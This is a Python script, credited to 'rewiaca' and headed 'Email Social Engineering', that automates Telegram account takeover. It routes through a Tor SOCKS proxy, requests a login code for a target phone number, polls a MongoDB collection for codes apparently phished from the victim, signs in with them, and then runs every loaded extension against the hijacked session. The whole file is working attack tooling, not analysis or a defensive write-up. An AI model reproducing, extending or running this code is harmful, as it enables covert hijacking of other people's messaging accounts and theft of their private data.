__author__      = "rewiaca"
__copyright__   = "Copyright 2020, Email Social Engineering"
__credits__ = ["rewiaca", "", "",]
__license__ = "GPL"
__version__ = "1.0"
__maintainer__ = "rewiaca"
__status__ = "Dev"

import time, sys, os, traceback, asyncio, socks
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError, PhoneCodeInvalidError
from database import collection
from wlog import wlog

async def start():

    try:
        phone_number = sys.argv[1]
        if not phone_number.isdigit():
            wlog('Phone number only digits!')
            exit()
        wlog('< Starting for '+ phone_number)
        client = TelegramClient(phone_number, api_id, api_hash, proxy=(socks.SOCKS5, '127.0.0.1', 9050))
        await client.connect()
        
        if not await client.is_user_authorized():
        
            await client.send_code_request(phone_number)
            code = None
            
            i=0
            while i<120 and code == None:
                item = await collection.find_one({'phone': phone_number})
                if item:
                    for c in item['codes']:
                        if c['used'] == 0:
                            code = c['code']
                            await collection.update_one({'phone': phone_number, 'codes.used': 0}, {'$set': {'codes.$.used': 1}})
                wlog('AUTH: No code yet')
                time.sleep(0.5)
                i+=1
                            
            if code:
                try:
                    await client.sign_in(phone_number, code)
                    wlog('AUTH: Got active session')

                except PhoneCodeInvalidError:
                    wlog('AUTH: Invalid code: ' + code)
                    
                except SessionPasswordNeededError:
                    wlog('AUTH: 2FA security enabled. Failed to auth')
                    
        else:
            wlog('AUTH: Already have active session')
            
            
        if await client.is_user_authorized():

            for extension in extensions['authorized']:
                await extension().run(client)
            
        wlog('> End for: ' + phone_number)
                            
    
    except PhoneNumberInvalidError:
        wlog('PhoneNumberInvalidError')
    
    except:
        wlog(traceback.format_exc())
        

if __name__ == '__main__':
    
    from config import config
    
    api_id = config.getint('Main', 'api_id')
    api_hash = config.get('Main', 'api_hash')
    
    # Load Extensions 
    import importlib

    extensions = {'authorized': [] }
    for ext in os.listdir('extensions'):
        if '.' in ext:
            extname = ext.split('.')[0]
            c = importlib.import_module('extensions.' + extname)
            extensions['authorized'].append(getattr(c, extname))
    
    # Start client standalone
    futures = []
    futures.append(start())

    loop = asyncio.get_event_loop()
    loop.run_until_complete(asyncio.wait(futures))
